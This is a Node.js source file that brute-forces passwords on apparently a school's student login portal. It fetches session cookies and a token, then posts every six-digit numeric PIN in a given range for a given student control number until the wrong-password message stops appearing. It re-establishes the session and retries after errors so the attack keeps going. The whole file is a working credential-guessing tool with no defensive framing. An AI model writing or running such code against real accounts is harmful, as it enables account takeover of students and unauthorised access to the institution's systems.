'use strict';
const axios = require('axios'),
    Json = require('../utils/json'),
    queryString = require('querystring'),
    {
        ResponseMessage
    } = require('../models/response'),
    routes = Json.load(__dirname, "./values/routes.json"),
    elements = Json.load(__dirname, './values/login/elements.json'),
    responses = Json.load(__dirname, './values/login/responses.json'),
    colors = require('colors'),
    sessionReq = require('./session');

/** @member {SessionData} sessionData Información de la sessión */
let sessionData = null;

/** @member {axios} axiosReq Instancia de axios*/
let axiosReq = axios.create({
    baseURL: routes.baseURL,
    withCredentials: true
});

/** @member {Number} index Iteración en la que se encuentra */
// let index = 0;

/**
 * 
 */
module.exports = async function getPassword(values) {
    if (sessionData === null) {
        sessionData = await sessionReq.sessionInitializer();
        if (sessionData.status) {
            if (sessionData.status === 200) {
                axiosReq.defaults.headers.post.Cookie = sessionData.cookies;
                return getPassword(values);
            } else if (!sessionData.token) {
                return new ResponseMessage("Token not found", 400, "Error at retrieving a new token");
            } else {
                return new ResponseMessage("Cookies not found", 400, "Error at retrieving new cookies");
            }
        } else {
            return new ResponseMessage("Error at retrieving session data", 400, sessionData);
        }
    } else {
        const PASSWORD = `${values.index}`.padStart(6, '0');
        console.log(colors.yellow(` Validating Password ${PASSWORD}`));
        const credentials = queryString.stringify({
            [elements.controlNumber]: values.controlNumber,
            [elements.password]: PASSWORD,
            [elements.token]: sessionData.token
        });
        try {
            const loginResponse = await axiosReq.post(routes.authorizeStudent, credentials);
            ++values.index;
            if (values.index <= values.max) {
                if (loginResponse.data.includes(responses.WRONG_PASSWORD)) {
                    return getPassword(values);
                } else {
                    return new ResponseMessage(PASSWORD, 200, null);
                }
            } else {
                return new ResponseMessage("No se encontro la contraseña en este rango", 400, null);
            }
        } catch (error) {
            if (error.response) {
                if (error.response.status === 500 && error.response.data.includes(responses.SYSTEM_ERROR)) {
                    console.log(colors.yellow('Invalid Cookies'));
                    sessionData = null;
                    return getPassword(values);
                } else {
                    return new ResponseMessage(error.message, error.response.status, error.stack);
                }
            } else if (error.errno === "ECONNRESET") {
                console.log(colors.red(" Connection Reseted"));
                return getPassword(values);
            } else {
                return new ResponseMessage(error.message, 500, error.stack);
            }
        }
    }
}

// module.exports = async (values, done) => {
//     let index = values.index;
//     let max = values.max;
//     while(index <= max) {
//         setTimeout(() => {
//             console.log(index++);
//         }, values.timeout);
//     }
//     done(index);
// }

// process.on('print', async (values) => {
//     const maxIndex = await printIndex(values);
//     process.send({
//         max: maxIndex
//     });
// });
